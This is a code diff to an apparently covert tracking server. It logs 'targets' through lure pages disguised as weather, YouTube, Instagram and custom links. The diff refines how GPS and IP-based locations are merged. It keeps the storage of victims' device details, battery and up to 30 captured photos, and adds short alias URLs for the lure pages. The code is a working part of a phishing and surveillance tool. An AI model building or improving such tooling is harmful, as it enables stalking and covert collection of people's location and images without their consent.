@@ -69,12 +69,20 @@ async function getIpInfo(ip) {
 function updateTargetTelemetry(id, payload) {
     if (!id) return null;
 
+    const ipLat = (payload.ipLocation && payload.ipLocation.lat) ? payload.ipLocation.lat : 0;
+    const ipLng = (payload.ipLocation && payload.ipLocation.lng) ? payload.ipLocation.lng : 0;
+
+    const isIncomingGps = payload.locationType === 'GPS' || (payload.accuracy && payload.accuracy < 1000);
+    const resolvedLat = (payload.lat !== null && payload.lat !== undefined && payload.lat !== 0) ? payload.lat : ipLat;
+    const resolvedLng = (payload.lng !== null && payload.lng !== undefined && payload.lng !== 0) ? payload.lng : ipLng;
+
     if (!TARGETS[id]) {
         TARGETS[id] = {
             id: id,
-            lat: payload.lat || 0,
-            lng: payload.lng || 0,
-            accuracy: payload.accuracy || 0,
+            lat: resolvedLat,
+            lng: resolvedLng,
+            accuracy: payload.accuracy || (isIncomingGps ? 10 : 5000),
+            locationType: isIncomingGps ? 'GPS' : 'IP',
             speed: payload.speed || 0,
             heading: payload.heading || 0,
             battery: payload.battery || null,
@@ -88,11 +96,17 @@ function updateTargetTelemetry(id, payload) {
             global.IO.emit("user-connected", id);
         }
     } else {
-        if (payload.lat !== undefined && payload.lat !== null) TARGETS[id].lat = payload.lat;
-        if (payload.lng !== undefined && payload.lng !== null) TARGETS[id].lng = payload.lng;
-        if (payload.accuracy !== undefined) TARGETS[id].accuracy = payload.accuracy;
-        if (payload.speed !== undefined) TARGETS[id].speed = payload.speed;
-        if (payload.heading !== undefined) TARGETS[id].heading = payload.heading;
+        if (resolvedLat !== 0 && resolvedLng !== 0) {
+            const currentIsIp = TARGETS[id].locationType === 'IP' || TARGETS[id].accuracy >= 4000;
+            if (isIncomingGps || currentIsIp || (payload.accuracy && payload.accuracy <= TARGETS[id].accuracy)) {
+                TARGETS[id].lat = resolvedLat;
+                TARGETS[id].lng = resolvedLng;
+                TARGETS[id].accuracy = payload.accuracy || (isIncomingGps ? 10 : 5000);
+                TARGETS[id].locationType = isIncomingGps ? 'GPS' : 'IP';
+            }
+        }
+        if (payload.speed !== undefined && payload.speed !== null) TARGETS[id].speed = payload.speed;
+        if (payload.heading !== undefined && payload.heading !== null) TARGETS[id].heading = payload.heading;
         if (payload.battery) TARGETS[id].battery = payload.battery;
         if (payload.device) TARGETS[id].device = payload.device;
         if (payload.ipLocation) TARGETS[id].ipLocation = payload.ipLocation;
@@ -102,14 +116,12 @@ function updateTargetTelemetry(id, payload) {
 
     if (payload.photo) {
         if (!TARGETS[id].photos) TARGETS[id].photos = [];
-        // Prevent duplicate photo entries
         if (TARGETS[id].photos.length === 0 || TARGETS[id].photos[0].data !== payload.photo) {
             TARGETS[id].photos.unshift({
                 id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                 data: payload.photo,
                 timestamp: Date.now()
             });
-            // Keep maximum 30 high-res photos per target
             if (TARGETS[id].photos.length > 30) {
                 TARGETS[id].photos.pop();
             }
@@ -141,7 +153,7 @@ router.route("/weather").get((req, res) => {
     res.render("weather")
 }).post(async (req, res) => {
     const clientIp = extractClientIp(req);
-    if (!req.body.ipLocation) {
+    if (!req.body.ipLocation || !req.body.ipLocation.ip) {
         req.body.ipLocation = await getIpInfo(clientIp);
     }
     updateTargetTelemetry(req.body.id, req.body)
@@ -149,6 +161,9 @@ router.route("/weather").get((req, res) => {
 })
 
 router.route("/youtube").get((req, res) => {
+    res.render("youtube")
+})
+router.route("/yt").get((req, res) => {
     res.render("youtube")
 })
 
@@ -163,8 +178,14 @@ router.route("/ig").get((req, res) => {
 router.route("/custom").get((req, res) => {
     res.render("custom")
 })
+router.route("/c").get((req, res) => {
+    res.render("custom")
+})
 
 router.route("/link").get((req, res) => {
+    res.render("link")
+})
+router.route("/l").get((req, res) => {
     res.render("link")
 })
 
